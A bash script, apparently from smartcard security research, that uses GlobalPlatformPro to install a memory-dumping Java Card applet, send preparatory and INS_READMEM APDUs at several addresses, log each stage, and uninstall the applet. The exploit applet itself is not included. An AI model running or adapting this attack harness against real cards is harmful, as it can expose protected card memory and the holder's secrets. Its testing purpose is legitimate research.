#!/bin/bash
source ~/.bash_aliases

function usage() {
cat << EOF
Usage: $0 options

    -a      Name of the card.
EOF
}

EMV=""
while getopts "ha:e" OPTION
do
    case "$OPTION" in
        h)
            usage
            exit 1
            ;;
        a)
            CARD_NAME="$OPTARG"
            ;;
        e)
            EMV="--emv"
            echo "Using EMV"
            ;;
    esac
done

if [[ -z "$CARD_NAME" ]]; then
    usage
    exit 1
fi

attack_id="$(echo "$(date +%s)" | sha1sum | awk '{ print $1 }')"

echo "Check applets and state"
record\
    --name "$CARD_NAME"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "check"\
    -- gp --verbose --debug --list "$EMV"

echo "Install?"
read
record\
    --name "$CARD_NAME"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "installation"\
    -- gp --verbose --debug --install com.dumpmemapplet-jc212.cap "$EMV"
# check applet state after installation
record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "check-installation"\
    -- gp --list "$EMV"

echo "Send INS_PREPARE1?"
read
record --name "$CARD_NAME"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "send INS_PREPARE1"\
    -- gp --verbose --debug --apdu 00a4040006010000000401 --apdu 8001000000 "$EMV"

record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "check-send INS_PREPARE1"\
    -- gp --list "$EMV"

echo "Send INS_PREPARE2?"
read
record --name "$CARD_NAME"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "send INS_PREPARE2"\
    -- gp --verbose --debug --apdu 00a4040006010000000401 --apdu 8002000000 "$EMV"

record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "check-send INS_PREPARE2"\
    -- gp --list "$EMV"


for address in 0000 0020 3017 3201 4000 5000;
do
    echo "Send INS_READMEM at $address?"
    record --name "$CARD_NAME"\
        --attack-name "BasicTransaction"\
        --attack-id "$attack_id"\
        --stage "send INS_READMEM at $address"\
        -- gp --verbose --debug --apdu 00a4040006010000000401 --apdu 8004"$address"00 "$EMV"

    record --name "$CARD_NAME"\
        --comment "Check applets and their states"\
        --attack-name "BasicTransaction"\
        --attack-id "$attack_id"\
        --stage "check-send INS_READMEM at $address"\
        -- gp --list "$EMV"
done

echo "Uninstall?"
read
record --name "$CARD_NAME"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "uninstallation"\
    -- gp --verbose --debug --uninstall com.dumpmemapplet-jc212.cap "$EMV"

record --name "$CARD_NAME"\
    --comment "Check applets and their states"\
    --attack-name "BasicTransaction"\
    --attack-id "$attack_id"\
    --stage "check-uninstallation"\
    -- gp --list "$EMV"
